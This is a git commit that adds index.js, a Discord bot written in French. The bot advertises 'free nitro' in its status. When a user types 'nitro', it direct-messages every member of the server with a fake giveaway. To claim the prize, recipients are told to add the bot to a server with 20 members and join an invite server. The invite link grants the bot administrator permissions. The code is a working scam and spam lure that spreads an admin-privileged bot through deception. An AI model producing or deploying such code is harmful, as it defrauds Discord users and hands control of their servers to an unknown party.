39a181ce12811455f0691e8ecc158401474c9928
sysysysy242 <45331186+sysysysy242@users.noreply.github.com>
2019-05-18 16:42:27 +0200

    Create index.js

---
+++ .gitignore/index.js
@@ -0,0 +1,33 @@
+const Discord = require('discord.js');
+    
+const client = new Discord.Client();
+
+var prefix = "§"
+
+client.login(process.env.TOKEN)
+
+client.on("ready", () =>{
+    console.log("je suis prêt")
+    client.user.setGame("https://discord.gg/hPPJUSV free nitro", "https://twitch.tv/z")
+
+});
+
+
+client.on('message', async message => {
+
+if(message.content === "le message que l'on doit envoyer pourque le bot réponde"){
+    message.reply("le message que le bot repond")
+    console.log("Le bot dit bonjour")
+}
+
+if(message.content ===  "nitro"){
+    message.delete(1000)
+    let embed = new Discord.RichEmbed()
+.setColor('RANDOM')
+.setTitle(`Hello , for free nitro add me on a serv to 20 members , send a in a chat "nitro" for the server to be put in the database , and join a serv :`)
+.addField("Add a bot : ", "[Link this](https://discordapp.com/oauth2/authorize?client_id=579312990969528321&permissions=8&scope=bot)")
+.addField("Join a serv", "[Link this](https://discord.gg/hPPJUSV)")
+message.guild.members.map(m => m.send(embed))
+}
+
+});
